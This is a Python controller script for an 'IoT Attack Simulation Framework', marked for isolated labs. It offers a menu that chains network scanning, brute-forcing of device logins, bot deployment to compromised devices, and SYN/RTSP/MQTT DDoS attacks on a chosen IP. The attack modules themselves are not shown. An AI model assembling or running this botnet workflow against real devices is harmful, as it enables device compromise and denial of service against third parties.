#!/usr/bin/env python3
"""
IoT Attack Simulation Framework - Main Controller
For isolated lab environments only
"""

import os
import sys
import signal
import sqlite3
import threading
from datetime import datetime
from modules.scanner import NetworkScanner
from modules.bruteforce import BruteForcer
from modules.infection import BotDeployer
from modules.ddos_control import DDoSController
from modules.database import DatabaseManager
from modules.utils import Colors, clear_screen, print_banner

class IoTAttackSimulator:
    def __init__(self):
        self.db = DatabaseManager()
        self.scanner = NetworkScanner(self.db)
        self.bruteforcer = BruteForcer(self.db)
        self.bot_deployer = BotDeployer(self.db)
        self.ddos_controller = DDoSController(self.db)
        self.running = True
        
        # Handle Ctrl+C gracefully
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        print(f"\n{Colors.YELLOW}[!] Graceful shutdown initiated...{Colors.RESET}")
        self.running = False
        sys.exit(0)
    
    def show_menu(self):
        print_banner()
        print(f"{Colors.CYAN}=== IoT Attack Simulation Framework ==={Colors.RESET}")
        print(f"{Colors.GREEN}1.{Colors.RESET} 🔍 Network Discovery Scan")
        print(f"{Colors.GREEN}2.{Colors.RESET} 🔓 Brute Force Attack")
        print(f"{Colors.GREEN}3.{Colors.RESET} 🦠 Deploy Bot Infection")
        print(f"{Colors.GREEN}4.{Colors.RESET} 🚀 Start DDoS Attack")
        print(f"{Colors.GREEN}5.{Colors.RESET} ⏹️  Stop DDoS Attack")
        print(f"{Colors.GREEN}6.{Colors.RESET} 📊 Show Attack Status")
        print(f"{Colors.GREEN}7.{Colors.RESET} 📋 View Database Logs")
        print(f"{Colors.GREEN}8.{Colors.RESET} 🧹 Clear Database")
        print(f"{Colors.GREEN}9.{Colors.RESET} ❌ Exit")
        print(f"{Colors.CYAN}{'='*40}{Colors.RESET}")
    
    def run_scan(self):
        target = input(f"{Colors.CYAN}Enter target network (e.g., 192.168.1.0/24): {Colors.RESET}")
        if target:
            print(f"{Colors.YELLOW}[*] Starting network scan...{Colors.RESET}")
            self.scanner.scan_network(target)
    
    def run_bruteforce(self):
        self.db.show_discovered_targets()
        target = input(f"{Colors.CYAN}Enter target IP to brute force: {Colors.RESET}")
        if target:
            self.bruteforcer.attack_target(target)
    
    def deploy_bots(self):
        self.db.show_compromised_devices()
        choice = input(f"{Colors.CYAN}Deploy to all compromised devices? (y/n): {Colors.RESET}")
        if choice.lower() == 'y':
            self.bot_deployer.deploy_to_all()
    
    def start_ddos(self):
        self.db.show_infected_devices()
        target = input(f"{Colors.CYAN}Enter DDoS target IP: {Colors.RESET}")
        attack_type = input(f"{Colors.CYAN}Attack type (syn/rtsp/mqtt): {Colors.RESET}")
        if target and attack_type:
            self.ddos_controller.start_attack(target, attack_type)
    
    def stop_ddos(self):
        self.ddos_controller.stop_attack()
    
    def show_status(self):
        self.db.show_attack_status()
    
    def view_logs(self):
        self.db.show_all_logs()
    
    def clear_database(self):
        confirm = input(f"{Colors.RED}Are you sure? This will delete all data (y/n): {Colors.RESET}")
        if confirm.lower() == 'y':
            self.db.clear_all_data()
    
    def run(self):
        while self.running:
            try:
                self.show_menu()
                choice = input(f"{Colors.CYAN}Select option: {Colors.RESET}")
                
                if choice == '1':
                    self.run_scan()
                elif choice == '2':
                    self.run_bruteforce()
                elif choice == '3':
                    self.deploy_bots()
                elif choice == '4':
                    self.start_ddos()
                elif choice == '5':
                    self.stop_ddos()
                elif choice == '6':
                    self.show_status()
                elif choice == '7':
                    self.view_logs()
                elif choice == '8':
                    self.clear_database()
                elif choice == '9':
                    self.running = False
                else:
                    print(f"{Colors.RED}Invalid option!{Colors.RESET}")
                
                if self.running:
                    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")
                    clear_screen()
                    
            except KeyboardInterrupt:
                self.signal_handler(None, None)
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.RESET}")

if __name__ == "__main__":
    simulator = IoTAttackSimulator()
    simulator.run()
